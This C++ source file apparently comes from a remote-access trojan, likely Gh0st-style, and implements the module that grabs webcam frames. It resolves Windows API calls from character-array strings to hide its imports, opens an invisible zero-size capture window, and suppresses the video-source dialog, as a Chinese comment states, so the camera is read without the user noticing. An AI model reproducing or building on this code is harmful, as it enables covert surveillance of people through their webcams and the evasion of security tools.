// VideoCap.cpp: implementation of the CVideoCap class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "VideoCap.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
bool CVideoCap::m_bIsConnected = false;

CVideoCap::CVideoCap()
{
	typedef __out HANDLE (WINAPI *CreateEventAT)
		(
		__in_opt LPSECURITY_ATTRIBUTES lpEventAttributes,
		__in     BOOL bManualReset,
		__in     BOOL bInitialState,
		__in_opt LPCSTR lpName
		);
	char DEtLjaQ[] = {'C','r','e','a','t','e','E','v','e','n','t','A','\0'};
	CreateEventAT pCreateEventA = (CreateEventAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DEtLjaQ);

	
	typedef HWND
		(VFWAPI
		*capCreateCaptureWindowAT)(
        LPCSTR lpszWindowName,
        DWORD dwStyle,
        int x, int y, int nWidth, int nHeight,
        HWND hwndParent, int nID);
	capCreateCaptureWindowAT pcapCreateCaptureWindowA=(capCreateCaptureWindowAT)GetProcAddress(LoadLibrary("AVICAP32.dll"),"capCreateCaptureWindowA");

	// If FALSE, the system automatically resets the state to nonsignaled after a single waiting thread has been released.
	m_hCaptureEvent = pCreateEventA(NULL, FALSE, FALSE, NULL);

	m_lpbmi = NULL;
	m_lpDIB = NULL;


	if (!IsWebCam() || m_bIsConnected)
		return;
	m_hWnd = CreateWindow("#32770", /* Dialog */ "", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	m_hWndCap = pcapCreateCaptureWindowA
		(
		"CVideoCap", 
		WS_CHILD | WS_VISIBLE,
		0,
		0,
		0,
		0,
		m_hWnd,
		0
		);
}

CVideoCap::~CVideoCap()
{
	typedef BOOL (WINAPI *CloseHandleT)
		(
		__in HANDLE hObject
		);
	char DDZGlGm[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle = (CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DDZGlGm);
	
	typedef BOOL
		(WINAPI
		*CloseWindowT)(
		__in  HWND hWnd);
	CloseWindowT pCloseWindow=(CloseWindowT)GetProcAddress(LoadLibrary("USER32.dll"),"CloseWindow");

	if (m_bIsConnected)
	{
		capCaptureAbort(m_hWndCap);
		capDriverDisconnect(m_hWndCap);

		if (m_lpbmi)
			delete m_lpbmi;
		if (m_lpDIB)
			delete m_lpDIB;
		m_bIsConnected = false;
	}

	capSetCallbackOnError(m_hWndCap, NULL);
	capSetCallbackOnFrame(m_hWndCap, NULL);	

	pCloseWindow(m_hWnd);
	pCloseWindow(m_hWndCap);

	pCloseHandle(m_hCaptureEvent);
}
// 自定义错误,不让弹出视频源对话框
LRESULT CALLBACK CVideoCap::capErrorCallback(HWND hWnd,	int nID, LPCSTR lpsz)
{
	return (LRESULT)TRUE;
}

LRESULT CALLBACK CVideoCap::FrameCallbackProc(HWND hWnd, LPVIDEOHDR lpVHdr)
{
	typedef BOOL (WINAPI *SetEventT)
		(
		__in HANDLE hEvent
		);
	SetEventT pSetEvent = (SetEventT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"SetEvent");

	try
	{
		CVideoCap *pThis = (CVideoCap *)capGetUserData(hWnd);
		if (pThis != NULL)
		{
			memcpy(pThis->m_lpDIB, lpVHdr->lpData, pThis->m_lpbmi->bmiHeader.biSizeImage);
			pSetEvent(pThis->m_hCaptureEvent);
		}
	}catch(...){};
	return 0;
}


LPBYTE CVideoCap::GetDIB()
{
	typedef DWORD (WINAPI *WaitForSingleObjectT)
		(
		__in HANDLE hHandle,
		__in DWORD dwMilliseconds
		);
	char bcONXFi[] = {'W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t','\0'};
	WaitForSingleObjectT pWaitForSingleObject = (WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),bcONXFi);

	capGrabFrameNoStop(m_hWndCap);
	DWORD	dwRet = pWaitForSingleObject(m_hCaptureEvent, 3000);

	if (dwRet == WAIT_OBJECT_0)
		return m_lpDIB;
	else
		return NULL;
}
bool CVideoCap::IsWebCam()
{
	
	typedef BOOL
		(VFWAPI
		*capGetDriverDescriptionAT)(
        UINT wDriverIndex,
        LPSTR lpszName, int cbName,
        LPSTR lpszVer, int cbVer);
	capGetDriverDescriptionAT pcapGetDriverDescriptionA=(capGetDriverDescriptionAT)GetProcAddress(LoadLibrary("AVICAP32.dll"),"capGetDriverDescriptionA");

	// 已经连接了
	if (m_bIsConnected)
		return false;
	
	bool	bRet = false;
	
	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = pcapGetDriverDescriptionA(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}

bool CVideoCap::Initialize(int nWidth, int nHeight)
{
	CAPTUREPARMS	gCapTureParms ; //视频驱动器的能力
	CAPDRIVERCAPS	gCapDriverCaps;
	DWORD			dwSize;

	if (!IsWebCam())
		return false;

	capSetUserData(m_hWndCap, this);
	
	capSetCallbackOnError(m_hWndCap, capErrorCallback);
	if (!capSetCallbackOnFrame(m_hWndCap, FrameCallbackProc))
	{
		return false;
	}

	// 将捕获窗同驱动器连接
	for (int i = 0; i < 10; i++)
	{
		if (capDriverConnect(m_hWndCap, i))
			break;
	}
	if (i == 10)
		return false;
	
	
	dwSize = capGetVideoFormatSize(m_hWndCap);
	m_lpbmi = new BITMAPINFO;

	// M263只支持176*144 352*288 (352*288 24彩的试验只支持biPlanes = 1)
	capGetVideoFormat(m_hWndCap, m_lpbmi, dwSize);
	// 采用指定的大小
	if (nWidth && nHeight)
	{
 		m_lpbmi->bmiHeader.biWidth = nWidth;
 		m_lpbmi->bmiHeader.biHeight = nHeight;
		m_lpbmi->bmiHeader.biPlanes = 1;
		m_lpbmi->bmiHeader.biSizeImage = (((m_lpbmi->bmiHeader.biWidth * m_lpbmi->bmiHeader.biBitCount + 31) & ~31) >> 3) * m_lpbmi->bmiHeader.biHeight;
		// 实验得知一些摄像头不支持指定的分辩率
 		if (!capSetVideoFormat(m_hWndCap, m_lpbmi, sizeof(BITMAPINFO)))
			return false;
	}

	m_lpDIB = new BYTE[m_lpbmi->bmiHeader.biSizeImage];

	capDriverGetCaps(m_hWndCap, &gCapDriverCaps, sizeof(CAPDRIVERCAPS));
	
	capOverlay(m_hWndCap, FALSE);
	capPreview(m_hWndCap, FALSE);	
	capPreviewScale(m_hWndCap, FALSE);

	m_bIsConnected = true;

	return true;
}
